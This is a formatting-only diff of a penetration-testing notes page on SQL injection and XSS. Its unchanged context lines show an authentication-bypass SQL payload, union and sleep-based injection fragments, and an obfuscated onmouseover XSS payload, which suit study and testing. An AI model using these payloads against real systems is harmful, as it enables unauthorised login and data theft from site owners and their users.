@@ -26,7 +26,7 @@ select * from users where user_id = 1 union all select 1,(select group_concat(us
 ### Authentication Bypass
 
 ```sql
-mysql> select * from users where user='admin' and password='blah' or 1 # 5f4dcc3b5aa765d61d8327deb882cf99' 
+mysql> select * from users where user='admin' and password='blah' or 1 # 5f4dcc3b5aa765d61d8327deb882cf99'
 ```
 
 ![](../../.gitbook/assets/screenshot-from-2018-11-17-16-16-06.png)
@@ -79,7 +79,7 @@ select * from users where user_id = 1 union select 1,2,3,4,5,sleep(1);
 
 ![](../../.gitbook/assets/screenshot-from-2018-11-17-15-53-52.png)
 
-```
+```text
 
 ```
 
@@ -105,10 +105,10 @@ Say we have the following PHP code that takes `name` as a user supplied paramete
 Line 3 is vulnerable to XSS, and we can break out of the input with a single quote `'`:
 
 ```php
-$sanitized=strtoupper(htmlspecialchars($input));   
+$sanitized=strtoupper(htmlspecialchars($input));
 ```
 
-For example, if we set the `name` parameter to the value of  `a'`, we get:
+For example, if we set the `name` parameter to the value of `a'`, we get:
 
 ![](../../.gitbook/assets/screenshot-from-2018-11-17-21-54-22.png)
 
@@ -124,11 +124,11 @@ A' onmouseover='[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]
 
 ## References
 
-{% embed url="http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet" %}
+{% embed url="http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet" caption="" %}
 
-{% embed url="http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet" %}
+{% embed url="http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet" caption="" %}
 
-{% embed url="http://breakthesecurity.cysecurity.org/2010/12/hacking-website-using-sql-injection-step-by-step-guide.html" %}
+{% embed url="http://breakthesecurity.cysecurity.org/2010/12/hacking-website-using-sql-injection-step-by-step-guide.html" caption="" %}
 
-{% embed url="https://www.youtube.com/watch?v=Rqt\_BgG5YyI" %}
+{% embed url="https://www.youtube.com/watch?v=Rqt\_BgG5YyI" caption="" %}
 
